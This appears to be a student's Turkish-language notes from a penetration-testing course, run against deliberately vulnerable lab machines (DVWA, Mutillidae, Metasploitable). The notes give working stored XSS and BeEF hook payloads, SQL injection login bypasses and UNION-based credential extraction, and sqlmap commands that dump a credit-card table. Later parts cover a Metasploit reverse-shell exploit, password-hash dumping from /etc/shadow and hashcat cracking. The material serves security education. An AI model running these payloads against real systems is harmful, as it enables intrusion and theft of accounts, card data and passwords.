+bu dersimizde stored xss (kayıtlı/depolanmış/saklanmış) türünü öğreneceğiz bu çeşitte reflected dan farklı olarak zaafiyete sebeo olan url yi
+ başka birine atıp tıklamasını sağlamamıza gerek olmadan bu xss i örneğin bir blog sayfası için yorum yaptığımızı düşünürsek
+  xss e sebep olacak bir yorum oluşturursak bu yorum silinene kadar o sayfaya giren herkes o alert le veya alert değil de 
+  eğer o sayfaya giren herkesin terminalinden bizim bilgisayarımıza reverse shell ile bir bağlantı açılmasını sağlayabiliriz 
+
+dvwa den stored xss kısmına tıklıyoruz kali browserımızdan burada da name ve message isminde 2 adet input var seçtiğimiz bir isimle
+ bir mesaj yazmamız isteniliyor bu uygulamada aynı yorum örneğindeki gibi düşünebiliriz name kısmına lars message kısmına da 
+ <script>alet("i hack you") </script> ardından sign guestbook diyip submit ediyoruz ve sayfayı değiştirip tekrar stored xss e girdiğimizde 
+ reflected den farklı olarak -ki reflected da çıkıp tekrar girdiğimizde eski url den devam ettiğimiz için alert çıkarmak için 
+tekrar aynı scripti çalıştırmak zorundaydık- ama stored da çıkıp tekrar girdiğimizde yine otomatik olarak i hack you alertini alıyoruz 
+
+bu dersimizde beef ile xss i beraber kullandığımız bir hack uygulaması gerçekleştireceğiz kali terminalimizde beef i çalıştırıyoruz 
+kali browserımızda 127.0.0.1 adresine gidip beef i tarayıcı dan açıyoruz ve terminalde beef in bize vermiş olduğu Example: satırındaki
+ <script src= ile başlayan url yi kopyalıyoruz ve browserda dvwa stored xss kısmındaki message 
+inputuna yapıştırıyoruz ve bir problemimiz var kodumuz scri ye kadar yazılmış bu girilen inputta bir karakter sınırlaması olduğu anlamına gelir
+ bunu bypass etmek için sayfada boş bir kısımda sağ tık yapıp inspect element diyoruz açılan konsolda imleci üzerine getirdiğimiz kodun 
+ sayfada hangi sınırladı kapsadığı yani scope unu görüyoruz bizim istediğimiz kısım message box olan kısım bulduktan sonra ana etiketin
+  altındaki etiketlerin içerisinde dolaşmaya başlıyoruz taa ki maxlenght özelliğinin bulunduğu koda kadar 
+burada maxlenght=50 olarak ayarlanmış bunu 250 yapıyoruz ve koddaki ip kısmına kalimizin lokal ip sini yazarak değiştiriyoruz 
+portumuz 3000 olarak kalabilir name kısmına da james yazıyoruz ardından sign guesbook diyoruz ve hook url miz stored edildi siteye 
+bunu beef in olduğu sekmeyi açarak keni kendimizi hook ettiğimizi görerek doğrulayabiliriz 
+artık bu siteye giren herkes eğer tarayıcısı bu javascript kodunu çalıştırırsa bizim beef imize hook olacaklardır ve 
+tarayıcılarını tamamen kontrol edebileceğimiz duruma geleceklerdir windows sanal makinamızdan stored xss kısmına girerek de 
+başka cihazları hackleyebildiğimizi doğrulayabiliriz
+
+xss den naısl korulabiliriz öncelikle şüphelendiğimiz hiç bir linki açmamalıyız doğrualmadan ancak stored xss lere karşı da
+ bir önlem almak istersek daha önceki derslerde bahsettiğimiz örneğin tor tarayıcısında 
+javascrit kodlarını otomatik olarak engelleyen bir özellik vardı google chrome da da bu özelliği kullanabiliriz 
+bunun için chrome da sağ üstteki üst üste 3 nokta olan kısma tıklıyoruz oradan Settings > sol tarafta üst üste 3 satır halinde 
+uzun çizgilerin bulunduğu ikona tıklıyoruz ardından Advanced kısmına tıklıyoruz > Privacy and security > content settings 
+> JavaScript > Allowed kısmını sağ taraftaki mavi switch butonundan Blocked yapıyoruz spesifik olarak belli siteleri engellemek istiyorsak 
+aşağıdaki block başlığına ADD yapabiliriz ilgili siteyi 
+ya da whitelist yapmak istiyorsak allow kısmına SADECE güvendiğimiz siteleri ekleyebiliriz
+
+çeşitli websitelerinin sunduğu hizmete göre değişiklik gösteren kullanıcılarının bilgilerini,siteye eklemiş oldukları postları,fotoğrafları 
+kredi kartı bilgileri,ev adresleri,telefon num. gibi bilgilerin tutulduğu yere database ( veri-tabanı) denir sql de bu veritabanına 
+bir veri eklmek silmek,güncellemek veriyi kullanıcıya getirmek gibi veri üzerinde ihtiyaca yönelik bir hizmet sunan programlama diline denir 
+açılımı structured query language dir sql sayesinde son kullanıcı yani bizler veritabanlarıyla etkileşime geçebiliyoruz 
+https://sqliteonline.com/ üzerinden sql i kullanamyı ve sql in kod sizdizimini öğreneceğiz 
+sol taraftaki tablo başlığının altında bizim oluşturduğumuz tablolar bulunur  tablolar sql de kategorize edilmiş olan bilgilerin 
+sınıflandırıldığı anlamlı başlıklara ayrılarak bu başlıkların altında ilgili satırdaki bilgilerin detaylandırıldığı,özelliklerinin belirtildiği
+ bir yapıdır bir database in içerisinde birden fazla table olabilir bir tabloyu oluşturan 2 adet yapı vardır birincisi columns 
+ (sütunlar/ ilgili veriyi bir başlık dahilinde yukarıdan aşağı doğru sınıflandıran yapı) ikincisi de rows(satırlar) her bir sütun için 
+ farklı olan değerlerin yatay olarak sınıflandırıldığı yapı sqlite ı ilk açtığımızda üstteki beyaz formdaki alanda SELECT * FROM demo; diye bir
+kod çalıştırılmış bu demo isimli tablodan SELECT et yani  seç/getir *(yıldız) o tablodaki HER ŞEYİ FROM'da -dan -den anlamına gelir kendinden
+ sonraki tablo isminden bu bilgileri getir anlamında 
+
+bu dersimizde veritabanına yeni bir değer nasıl eklenir onu öğreneceğiz 
+
+INSERT INTO demo (id,name,hint) VALUES (18,"James","Guitar"); yazıp çalıştırıyoruz bu kodun anlamı INTERST INTO demo yani demo tablosunun içine
+ ekle (id,name,hint) yani id name ve hint sütunların altındaki bölümlere ekle VALUES (18,"James","Guitar"); yani sırayla id sütununun altındaki
+ kısma 18 name sütununun altındaki bölgeye James i ve hint kısmına da Guitar stringini ekle burada metinsel ifadeler " " tırnak işaretleri
+ arasında yazılırlar çünkü metinsel ifadelerdir 18 gibi integer -tam sayılar- da olduğu gibi yazılırlar bu kodu çalıştırdıktan sonra eklediğimiz
+yeni verileri tabloda göremiyoruz
+çünkü sql bir programlama dili olduğu için kendine hangi komutlar verildiye bunları yukarıdan aşağı doğru sırayla çalıştırır ve kendisine 
+çalıştırılması söylenmeyen hiç bir komutu çalıştırmaz bu yüzden bir değişklik yaptığımız komutlardan sonra her zaman tablonun güncel halini 
+görmek için her zaman SELECT * FROM tablo-ismi; -bu örnekte- SELECT * FROM demo; şeklinde yazmamız faydalı olacaktır 
+SELECT * FROM demo;
+
+bu dersimizde tablomuzdan belirli bir veriyi nasıl silebiliriz bunu öğreneceğiz 
+DELETE FROM demo WHERE name = "James"; komutu çalıştırdıktan sonra SELECT * FROM demo; ı çalıştırdığımızda ilgili verinin olduğu satırdaki 
+bilgilerin tamamının silindiğini görüyoruz sadece name sütunundaki james değeri değil o satırdaki bütün sutun değerleri de siliniyor
+sadece id sütunundaki değerimiz aynı kalıyor name sütunundaki değer kısmında DELETE hint kısmındaki değerde de DELETE FROM table_name 
+yazısı bizi karşılıyor 
+
+şimdi ilgili satırdaki id veya istediğimiz herhangi bir sütundaki değeri değiştirmeyi öğrenelim 
+
+örneğin 1. satırdaki id değeri 1 olan kısmı değiştirerek 100 yapmak istiyoruz bunu yapmak için 
+UPDATE demo SET ID = 100 WHERE Name= "SQL Online"; komutunu çalıştırıyoruz burada yaptığımız işlemler UPDATE demo yani demo tablosunu güncelle 
+SET ID = 100 yani ID sütünunundaki değeri 100 e ayarla/ set et/güncelle/değiştir WHERE name="SQL Online" -ama hangi id yi bunu tanımlamak için name
+sütunundaki değer SQL Online olan satırdaki ID değerini değiştir yani 1. satırdaki id değerini 
+dedikten sonra select *from demo; çalıştırdığımızda artık id değeri 2 den başlıyor olacak ve bizim satırımız tablo içerisinde son
+ satıra taşınacaktır 
+
+bu dersimizde sql de filtrelemelerin nasıl yapıldığını öğreneceğiz 
+sql de belirli bir satırdaki değerleri görüntüleyebiliriz filtreleme kullanarak örneğin SELECT * FROM demo WHERE name = "Atil";
+dediğimizde name sütununda Atil stringini içeren satırları bizim için getirir gelen çıktıda Atil değerinin bulunduğu satırın tamamı 
+çıktı olarak verilir bu örnekte id = 18 name = Atil hint = test yani o satırda tabloda kaç adet sütun kullanılmışsa o sütünların değerleri de 
+satırda yer alır yine aynı şekilde SELECT * FROM demo WHERE id = 15; şeklinde de bir filtreleme uygulayabiliriz 
+
+
+SELECT * FROM demo WHERE name LIKE = "A%"; şeklinde bir komut çalıştırırsak demo tablosundaki name sütunun altında a/A ile başlayan stringleri 
+bize çıktı olarak verecektir 
+
+SELECT * FROM demo WHERE name LIKE = "%A"; bu komut da a/A ile biten stringleri getirecektir 
+
+SQL Kullanılan Kodlar
+
+Bölümde kullanılan SQL kodlarına buradan bakabilirsiniz:
+
+SELECT * FROM demo;
+
+INSERT INTO demo (id, name, hint) VALUES (18, "James", "Guitar");
+
+DELETE FROM demo WHERE name = "James";
+
+UPDATE demo SET id = 18 WHERE name = "Atil";
+
+SELECT * FROM demo WHERE name LIKE "%E";
+
+bu dersimizde metasploitable içindeki veritabanlarına sql injection yapmayı öğreneceğiz ms ve kali nat networkde kali browserdan 
+ms ip sini yazıyoruz 
+
+kali terminaline mysql -u root -h ms-ip-adresi [-u parametresi username i yani hangi kullanıcı ile bu veritabanına giriş yapılacağnı belirler]
+ardından show databases;[ya da show database/ya da show database; hepsini dene] diyerek diyerek ms deki veri tabanlarını görüntülüyoruz 
+use mysql diyerek bu veritabanına geçiş yapıyoruz ardından show tables; diyerek bu veritabanındaki tabloları görüntülüyoruz ardından
+ select * user; çalıştırıyoruz [user tablosuna girmek için] ardından exit diyip mysql -u root -h ms-ip-adresi komutunu tekrar çalıştırıyoruz
+show databases; çalıştırıyoruz ardından use owasp10; çalıştırıyoruz ardından show tables; çalıştırıyoruz 
+select * from credit_cards; çalıştırıyoruz ve kredi kartlarının bilgilerinin bulunduğu table ı görüntüledik 
+
+bu dersimizde muttillidae veritabanında bazı işlemler yapacağız bunun için kali browserdan ms ipsini yazıp enterlıyoruz 
+mutillidae yi seçiyoruz üstteki navigation bardan Login/Register kısmına tıklayıp siteye daha önce oluşturduğumuz kullanıcı ile 
+giriş yapıyoruz (normal bir kullanıcı ile giriş yapıyoruz admin veya yetkili bir kullanıcı ile değil!!!)
+eğer yeni bir kulanıcı oluşturduktan sonra bir hata alırsak "Error:Failure is always an option" başlığı ile, bu hatada kısaca
+ eklemek istediğimiz kullanıcının eklenmek istenildiği metasploit.accounts isimli bir veritabanının mevcut olmadığını söylüyor
+  bu hatayı çözmek için açık olan metasploitable makinesini açıyoruz sudo nano /var/www/mutillidae/config.inc komutunu çalıştırarak
+   nano editörü ile bu dizindeki config.inc isimli yapılandırma dosyasını açıp içeriğini değiştirip sonra kaydedeceğiz
+bu komutu çalıştırdğımızda bizim ms şifremizi istiyor msfadmin yazıp enterıyoruz açılan dökumanda $dbname = satırındaki
+ 'tırnak işaretleri' ; içindeki bu ifadeyi  'owasp10' olarak değiştiriyoruz ardından ctrl+x kaydediyoruz 
+ardıdan tekrar register here kısmıdan yeni bir kullanıcı oluşturmayı deneyebiliriz yeşil bir şeritin içerisinde account created mesajını alırsak
+kullanıcımız oluşturulmuştur demektir doğrulamak için login kısmından hesabımıza giriş yapıyoruz ardında logout diyoruz ve bu sefer kullanıcı
+ adımızı yazdıktan sonra password inputuna bir adet tek tırnak ' karakterini yazıyoruz ve login e basıyoruz yine bir hata aldık 
+diagnotic information satırında az önce yapmış olduğumuz login de hangi sql komutlarının çalıştırıldığını görebiliriz komutun en sonunda 
+password=''' şeklinde olduğunu görüyoruz bunun sebebi biz login olurken yazdığımız şifreyi string VANCHAR bir değer olarak kabul edip bunu 
+' ' tırnak işaretlerinin arasına alıp database e sorgu olarak göndermesinden dolayıdır ancak biz burada beklenilen bir değerden 
+farklı olarak (')tektırnak kullandığımız için bu hatayı aldık 
+
+önceki örnekte en son james | ' ile login olduğumuzda veritabanında SELECT * FROM accounts WHERE name='james' AND password=''' komutunu
+ çalıştırılmıştı bu komutun çalıştırıldığını aldığımız hata mesajında gördük bu şu anlama geliyor biz james ismiyle login olmak istediğimizde
+  bunu mutillidae nin veritabanındaki accounts tablosundan kontrol ediyor orada bu james isminin o tabloda varlığını kontrol ediyor 
+
+biz SELECT * FROM accounts WHERE name='james' AND password='111111' AND 1=2#' komutunu çalıştırarak # karakterinden sonra gelen herhangi bir 
+karakter kod içerisinde çalıştırılmayacağından dolayı bu şekilde login olarak veritabanının bize nasıl bir tepki verdiğini gözlemleyeceğiz 
+bu kodu çalıştırarak yapmak istediğimiz işlem 2. AND den sonra ki kısım çalıştırılacak mı çalıştırılmayacak mı bunu görmek 
+bu yüzden 6 tane 1 yazdık çünkü bu james in şifresi ancak 2. AND den sonrası çalıtırılırsa giriş yapamayacağız çünkü AND de ne kadar koşul varsa
+ bunların hepsi true olması gerekiyor ancak 1, iki rakamına eşit olmadığı için burası çalıştırılırsa hata alacağız 2. and den sonra 
+ # karakterini kullanmamızın sebebi de 1=2 yi yalın bir şekilde yazarsak sql bunu bir string olarak kabul edip tırnak işareti içine almaya
+  çalışabilir bunu engellemek için kendinden sonra gelen ifadeleri kodda çalıştırmayan # karakterini kullandık 
+
+login kısmına james password kısmına da  password='111111' AND 1=2# yazdık ve authentication error aldık bu AND den sonraki kısmın çalıştığı 
+anlamına gelir 
+
+bu dersimizde sql post metodu ile veritabanına admin olarak login olmayı deneyeceğiz 
+
+bunun için bir önceki örnekteki login sayfasına geliyoruz yine username: admin password: '1' OR 1=1#' yazıp login oluyoruz arkaplanda sql de 
+
+SELECT * FROM accounts WHERE name='admin' AND password='1' OR 1=1#' çalıştırılacaktır login olduğumuzda admin kullanıcısı/yetkisi ile
+ bağlanabildiğimizi görüyoruz ancak admin kulllanıcısının şifresi 1 değildi bu nasıl oldu bunun olmasının sebebi şifreyi 1 olarak girdikten 
+ sonra OR operatörünü kullanıp yeni bir koşul ekledik or = veya anlmına gelir bir bir işlemin gerçekleşmesi için 2 koşul varsa or operatörünü
+kullanarak bunlardan 1 tanesinin doğru olma durumunda işlemin gerçekleştiğini görebiliriz burada da bu oldu şifre 1 olmadığı için bu kısım
+false oldu ama or dan sonra 1=1 ifadesini kullandığımız için ve 1=1 olduğu için burası true oldu ve admin kullanıcısıyla giriş yapabildik 
+
+
+şimdi de # karakterini kullanarak password kısmını kodda çalıştırmadan direkt olarak admin kullanıcısıyla giriş yapmayı deneyelim 
+
+SELECT * FROM accounts WHERE name='admin'# AND password='xyz'  kodunu arka planda çalıştırarak yani username kısmına admin'# 
+password kısmına da password=xyz yazarak admin olarak giriş yapabiliriz 
+
+bu dersimizde sql enjeksiyonu get metodunu öğreneceğiz mutilidae > soldan owasp top 10 > a1 injection > sqli extract data > user info 
+kısmına tıklıyoruz 
+
+bu uygulamada gönderdiğimiz verileri url de parametreleri ile beraber görebiliyoruz 
+
+url ye username=james'#&password=111111 yapıyoruz ve enterlıyoruz ancak giriş yapamadık çünkü sunucunun bunun bir # karakteri olduğunu 
+anlaması için bu şekilde yazmamamız gerekiyor önce bunu sunucunun anlayacağı şekile encode edip urlnin içine yerleştirip o şekilde göndermemiz
+ gerekiyor burpsuit den # karakterini encode ettiğimizde %23 ifadesinin çıkdığını görüyoruz bunu alıp 
+ username=admin%23&password=111111 yazıp enterlarsak admin olarak giriş yapabiliriz 
+
+bu dersimizde accounts table ın içindeki tüm verileri ele geçirmeyi öğreneceğiz 
+
+url de username=admin'union select * from accounts%23&password=  şeklinde  bir değişiklik yapıyoruz burada sql de union sorgusunu çalıştırdık 
+bu sorgu accounts tablosundaki bütün verileri çekmemizi sağlıyor bu veriler arasında her mevcut olan bütün kullanıcıların her biri için 
+şifreleri ve signature(imzaları yer alır) bu işlemi (view your details uygulaamasında yaptık) (username den sonra 'admin' mı yoksa 
+admin' mı ikisini de dene ve ne çıktı aldığına bak)
+
+bu dersimizde veritabanının ismini nasıl öğrenebileceğimizi göreceğiz 
+
+yine bir önceki uygulamadayız username=admin'order by 1%23&password= şeklinde url yi değiştiriyoruz geri kalan ve öncekiler aynı 
+sadece admin' den sonra order by 1 yazdık order by ilgili tabloda kaydedilmiş olan sütunları çağırmamıza/getirmemize yarıyor order by 1 ile 
+1. sütunu getiririz order by 10 yazdığımızda bir hata alırız bu tabloda 10. sütun yok yani 10 adet sütun yok anlamında burada
+ deneme yanılma yolu ile 1 e doğru gidiyoruz ve order by 5 dediğimizde çalıştı ancak ekstra bir değer getirmedi bize
+ gelen bilgi 
+
+             username=admin 
+             password=adminpass
+             signature=monkey / ekstra bir bilgi elde edemedik ama bu tabloda 5 adet sütun olduğunu anlamış olduk 
+             order by kısmını silip union select 1, 2, 3, 4, 5 yazıyoruz yani  username=admin'union select 1, 2, 3, 4, 5%23&password=
+             şeklinde url yi değiştirdikten sonra bu sefer 
+             username=admin 
+             password=adminpass
+             signature=monkey çıktısına artı olarak 
+
+             username=2 
+             password=3
+             signature=4 bu çıktıdan şunu anlayabiliriz union ile çağırmış olduğumuz 1 ve 5. sütunlar dan bir bilgi gelmeyecek ancak 2,3 ve 4.
+              sütunları deneyebiliriz (neden 1 ve 5 yok neden 2,3,4 çıktısını aldık bunu kesin araştır)
+
+biz de url deki username=admin'union select 1, 2, 3, 4, 5%23&password= bölümüne 2,3 ve 4. kısma sırayla database(),user(),version() yazacağız 
+ve enterlıyacağız 
+
+ username=admin'union select 1, database(), user(), version(), 5%23&password=       son hali     
+
+username=owasp10 (database() komutunun yani içinde işlem yaptığımız database in ismini görütülememizi sağlayan komutun çıktısı)
+password=root@localhost (user()yani komutları hangi kullanıcı ismiyle çalıtırdığımızı görüntüleyen komutun çıktısı)
+signature=5.0.51a-3ubuntu5 [version( yani database in versiyonunun/yoksa database in içinde bulundurulduğu sunucunun versiyonunu yazdıran 
+komutun çıktısı -hangisi öğren)]
+
+
+bu dersimizde artık içinde işlem yaptığımız veritabanının isminin owasp10 olduğunu öğrendik şimdi de bu veritabanındaki table isimlerini nasıl 
+öğrenebiliriz bunu göreceğiz 
+
+username=admin'union select 1, table_name, null, null, 5 from information_schema.tables%23&password=  şeklinde veritabanının içindeki 
+table name leri öğrenmek için url yi bu şekilde değiştiriyoruz burada yazdığımız null da bu sütunlar için herhangi bir değer getirme demek 
+
+from information_schema.tables burada yazdığımız bu değer aslında bir veritabanı oluşturulduğunda otomatik olarak oluşan bir dosya bunun 
+içerisinde veritabanındaki tabloların isimleri tutuluyor bu veritabanı da linux bir cihaz üzerinde bulundurulduğu için default olarak
+ oluşturulan bu dosyayı deneyebiliriz [from information_schema.tables önceki gibi from * accounts dakiyle aynı komut mu yoksa bu bir dosya 
+ olduğu için farklı bir işleve sahip sadece dosyaları çalıştırmaya yarayan bir sql komutu mu onu öğren ]
+
+bu sefer bize 237 adet çıktı verdi bize bütün veritabanlarındaki bütün tabloların isimlerini verdi ama filtreleme yaparak sadece owasp10
+ VERİTABANI ile ilgili tabloisimlerini getirebiliriz gelen çıktılarda her Username=xxx kısmındaki değerlerin xxx olanları birer table name
+
+username=admin'union select 1, table_name, null, null, 5 from information_schema.tables where table.schema = 'owasp10'%23&password=
+komutu ile sadece owasp10 veritabanındaki bütün tablo isimlerini çekebiliriz 
+
+artık veritabanımızın ismini biliyoruz aradığımız table ın ismini de biliyoruz bu dersimizde owasp10 veritabanındaki sütun isimlerini 
+öğrenmeye çalşacağız;
+username=admin'union select 1, column_name, null, null, 5 from information_schema.columns where table_name = 'accounts'%23&password=
+
+şeklinde yazıp enterladıktan sonra acoounts table ındaki bütün sütun isimlerini çektik 
+
+column_name (sütun isimlerini getiren komut) from information_schema.column da verileri default olarak oluşturulan ve veritabanındaki bütün 
+column name lerin tutulduğu dosyadan çek diyoruz 
+
+where table_name = 'accounts' yazarak bu bilgileri hangi tabloda aramak istediğimizi belirtiyoruz 
+
+union select 1, username, password, is_admin, 5 from accounts sorgusunu çalıştırarak yani 
+
+username=admin'union select 1, username, password, is_admin, 5 from accounts'owasp10'%23&password= 
+
+accounts tablosundaki; username,password ve is_admin (ilgili kullanıcının admin mi değil mi/admin yetkisine sahip mi değil mi true veya false 
+değerini vererek belirtildiği bir tablo) ilgili verileri çekebiliriz TRUE olan kullanıcılar admin yetkisine sahip olanlar FALSE ise olmayanlar 
+
+bu dersimizde websitesindeki açıkları bulmaya çalışırken kullanabileceğimiz sqlmap toolunu öğrenelim bu tool bir sitede sql açığı var mı bunu 
+bulmamıza yardımcı olur bunun için hem kali hem ms nat networkde açık olacak 
+kali browserdan ms ip adresini yazıp mutillidae yi açıyoruz soldan owasp top 10 > a1-injection > sqli extract data > userinfo yu seçiyoruz 
+name kısmına admin password kısmına: öylesine yazıyoruz hata verdikten sonra tarayıcıdaki url yi kopyalıyoruz
+ kali ye gelip sqlmap -u "kopyaladığımız-url" komutunu çalıştırıyoruz (yapıştırdığımız url yi tırnak içerisine almamız gerekiyor)
+
+[y/n] diye gelen soruların ilk ikisine Y daha sonra gelen GET parameter 'username' is vulnerable olan soruya N diyoruz 
+ardından taramayı sonlandırdı sqlmap -u "kopyaladığımız-url" --dbs diyerek bu urldeki veritabanlarını görüntülüyoruz 
+ardından sqlmap -u "kopyaladığımız-url" --current-db çalıştırıyoruz ilgili url de kullanılan mevcut/güncel veritabanının ismini yazdırır 
+sqlmap -u "kopyaladığımız-url" --tables -D owasp10 komutunu çalıştırarak owasp10 in içerisindeki tüm table ları bulabiliriz 
+daha sonra sqlmap -u "kopyaladığımız-url" --columns -T credit_cards -D owasp10 çalıştırarak credits_cards isimli table un içerisindeki
+bütün sütunları getirebiliriz 
+
+sqlmap -u "kopyaladığımız-url" -T credit_cards -D owasp10 --dump komutu
+owasp10 veritabanındaki credit_cards tablosundaki bütün verileri indiririz 
+sqlmap --help yazarak sqlmap de kullanılabilecek parametreleri görebiliriz 
+
+bu derste zap isimli toolu kullanarak bir websitesindeki açıkları bulmayı görelim 
+
+kalinin application arayüzüne gidip zap yazıyoruz ve owasp-zap isminde üzerinde bir yıldırım ikonu bulunan programa tıklıyoruz 
+accept diyerek lisansı kabul ediyoruz gelen do you want to persist the zap session sorusuna 
+no i do not want to persist this session at this moment in time  diyoruz program açıldıktan sonra sağ taraftaki URL to attack inputuna zaafiyet 
+testi yapacağımız url yi gireceğiz alttaki history>search>alerts>output>+ TABLARINDAN + YA BASIP active scan (aktif tarama başlatabiliriz)
+active scan i ekledikten sonra active scan tab ına tıklayıp onun hemen altında bulunan satırın en başındaki küçük gri bir ekolayzer kontrolcüsü 
+simgesine tıklıyoruz bu taramanın policy manager ıdır  buradan tarama ile ilgili seçeneklerimizi değiştirebiliriz burada sağ daki add butonuna 
+basıyoruz Scan Policy başlığının altında injection kısmına tıklıyoruz burada siteye gerçekleştirilecek olan atakları ve onların 
+testte uygulanacak olan sıklığını/önemini seçebiliriz örneğin bu tarama için cross site scripting (persitent) in thresold kısımı 
+OFF SQL Injection un thresoldunu da High yapalım bu, bu taramada sql injection a daha fazla yoğunlaşacağımız anlamına gelir 
+
+url kısmına http://ms-ip-adresi/mutillidae/ yazıp Attack diyerek taramayı başlatıyoruz 
+
+tarama devam ederken taramayı durdurmak için ekolayzer ın olduğu satırda [II] ikonuna (Pause Active Scan) basarak taramayı durdurabiliriz 
+basıp durduruyoruz Alerts tabına gidip taramada tespit edilen açıkları kategorize edilmiş şekilde göreibliriz buradan ilgili açığın başlığının 
+en başındaki küçük ok ikonuna tıklayıp bulunan bu açık türüyle alakalı tespit edilen parametreleri görüntüleyebiliriz 
+örneğin xss başlığından herhangi bir açığa tıkladığımızda hemen sağ tarafında o açığın reflected mi stored mı olduğu paramtez içerisinde yazılır 
+onun hemen 2 üstündeki bölümde bu açığı ele geçirmek için nasıl bir http request/isteği istediğini gösteriyor onun hemen altında teknik detaylar 
+ve kodlar yer alıyor neden bu açığın ortaya çıktığı yer alır 
+
+dictinoary attack = sözlük saldırısı denek 
+hashlemek bir string veya metni alıp bir matematiksel algoritma ile karmaşık ve anlamsız karakterler ile bu clear metni gizlemek demektir
+M5,SHA,SHA256,SHA512 gibi hash algoritmaları bulunur 
+windows ve linux da şifrelerimiz yine hashlenmiş bir şekilde saklanır 
+linuxda şifreler md5,sha256 ve sha512 şeklinde hashlenerek tutulur bunlardan en güvenli olanı sha512 dir 
+örneğin root un şifresi md5 ile hashlenmişse bu root:$1$ eklinde başlar buradan md5 olduğunu sha512 de root un haslenmiş hali root:$6$ şeklinde
+başlar 2. iki nokta üst üsteye kadar (:) hash in kendisini görüyoruz 
+
+windows da ise hashler daha farklı bir algoritma ile saklanıyor LM ve NTLM isimli iki algoritma harmanlanarak tutulur 
+örneğin admin:500 şeklinde bir değerle başlıyorsa başındaki admin kullanıcı adı 500 de kullanıcı grubunu ifade eder 
+hash in ilk kısmında LM -daha az güvenli/eski olan algoritma- bulunurken ikinci kısmında da NTLM daha yeni olan daha güvenli olan 
+algortima bulunur hash in sonu da ::: şeklinde bitiyor LM algoritmasında parolada harf varsa büyük harflere çevriliyor eğer parola 
+14 karakterden uzunsa olduğu ilk 14 karakter hashlenir sonrasındaki karaklerler hashlenmeden clear olarak tutulur 
+
+bu derste bir sisteme sızdığımızda o sistemde bulunan şifrelerin hashlerini nasıl elde edebiliriz bunu öğreneceğiz 
+kali ve ms nat networkde açık ms den msfadmin msfadmin yazarak giriş yapıyoruz ifconfig yazarak ms ın ip adresini alıyoruz 
+kali terminalden msfconsole yazarak açıyoruz ardından use exploit/multi/misc/java_rmi_server diyip enterlıyoruz 
+show payloads>set payload java /meterpreter/reverse_tcp çalıştırıyoruz ardından show options çalıştırıyoruz 
+daha sonra set rhosts ms-ip-adresi diyip enterlıyoruz ardından exploit çalıştırıyoruz (komut olarak)
+biraz bekleyip entera basıyoruz ve sessions -l yaptığımızda açık olan oturumları görebiliriz session -1 (veya id si neyse) ilgili oturuma 
+girebiliriz msfconsole dan bir makineyi hackledikten sonra o sistemdeki bütün hashlenmiş verileri çekmek/indirmek/almak için hasdump komutunu
+ çalıştırabiliriz unknow command: hashdump hatası alırsak run post/linux/gather/hashdump[komuttaki terimlerin ne anlama geldiğini araştır] 
+ komutunu çalıştırabiliriz bu uygulamada linux bir makine için bu kodu çalıştırdık ama windows bir makine de olsa aynı komutu çalıştıracaktık
+run post/windows/gather/hashdump yazacaktık tek fark olarak daha sonra ilgili hashler yazdırılacak bunları kopyalayıp herhangi bir text editörün
+içerisine yapıştırabiliriz kali new tab terminalden cd /Downloads yapıp nano mymetasploitablehash.txt komutunu çalıştırıyoruz ardından
+ açılan dökumanda fare ile sağ tık yapıp paste clipboard dedikten sonra sonraki satırı silebiliriz ve her satırın başındaki 
+ [+] kısımlarını siliyoruz ardından ctrl+o yapıp kaydediyoruz ctrl+x ile çıkıyoruz msfconsole u kapatıp kali de temiz bir terminalde 
+ cat /etc/shadow çalıştırıyoruz bu dosyada sistemdeki tüm kullanıcıların şifrelerinin hashlenmiş halini görüyoruz 
+ unshadow /etc/passwd /etc/shadow komutu ne işe yarıyor öğren tam anlamadım 
+
+https://tobtu.com/lmntlm.php bu site ile elimizdeki şifreyi lm/ntlm ile hashleyebiliriz password formunda şifremizi yazıp 
+calculate hashes butonuna tıkladığımızda bunu hashleyecektir 
+
+hashcat hashleri kırmamızı sağlayan bir tooldur 
+hashcat i yüklemek için apt-get install hashcat yazıp yükleyebiliriz hashcat --help yazarak nasıl kullanıldığını öğrenebiliriz 
+/usr/share/wordlists dizininde hashcat te hash kırarken kullanabileceğimiz bazı wordlistleri bulabiliriz bu dizindeki dirbuster/big.txt 
+daha çok websitelerindeki şifre kırma işlemlerinde bizlere yardımcı olur yine bu yoldaki directory list 2.3 medium .txt de websitelerinde
+ en çok kullanılan wordlistlerdendir 
+fern-wifi klasörünün içerisinde wifi saldırıları için bir wordlist bulunur ctf lerde de wordlists/fastrack.txt ve /rockyou.txt kullanılır 
+hashcat -m 1800 mykalihash.txt /usr/share/wordlists/fasttrack.txt (fasttrack sölüğünü kullanarak 1800 kod adlı yani linuxdaki
+ kullanıcı parolasının tutulduğu hash türünün kodunu yazıyoruz) enterlıyoruz 
+info:all hashes found in potfile diye bir hata alırsak (muhtemelen ilk denemede böyle bir hata almayız) bu şu anlama geliyor 
+hashcat daha önce kırdığı hashleri potfile isimi bir dosyada tutar ve önce bu dosyayı tarar tekrar birdaha daha önce kırılan bir şifreyi kırıp
+ zaman kaybetmemek için kıracağımız hash de burada olduğu için bu hatayı almak istemiyorsak bu dosyanın içerisinde 
+ bu hash kısmını silmemiz lazım ve dersin kaynaklar bölümünden mykalihash.txt yi /Documents dizinine indirmemiz daha sonra cd /Documents diyip 
+ hashcat -m -ve devamını- burada çalıştırmamız gerekiyor böyle bir mesaj aldığımızda kırmak istediğimiz hash i ekrana bastırmak için örneğin
+  bu örnekte hashcat -m 1800 mykalihash.txt /usr/share wordlists/fasttrack.txt --show komutunu çalıştırırız ve alacağımız çıktı da 
+$6$MUwe5yW69qISIYv4$hJwIXL553w2M87cVn/xkKNjwBh9DTsn9aEwt9.XvFFKV8swB/x8UT/CBWiNdext9ojsazeQc/hXvp4k3C3ndZ0:123456 olacaktır 
+bu çıktının sonundaki: sonraki 123456 değeri bizim şifremizin clear halidir; baştan : olan kısma kadar da sha512 ile hashlenmiş halidir 
+potfile daki bu hash i silmek yerine 
+$6$MUwe5yW69qISIYv4$hJwIXL553w2M87cVn/xkKNjwBh9DTsn9aEwt9.XvFFKV8swB/x8UT/CBWiNdext9ojsazeQc/hXvp4k3C3ndZ0 --potfile-disable 
+diyerek bu potfile kontrol aşamasını devredışı bırakabiliriz bu kodu çalıştırdıktan sonra gelen çıktının Status satırında Cracked yazıyorsa
+ şifremiz kırılmıştır demektir 
+bu dersimizde de mylinuxhash.txt hashimizi kıracağız bu yüzden kaynaklar bölümünden bu dosyamızı indirip /Documents dizinine atıyoruz 
+-veya direk /Documents e indiriyoruz-
+
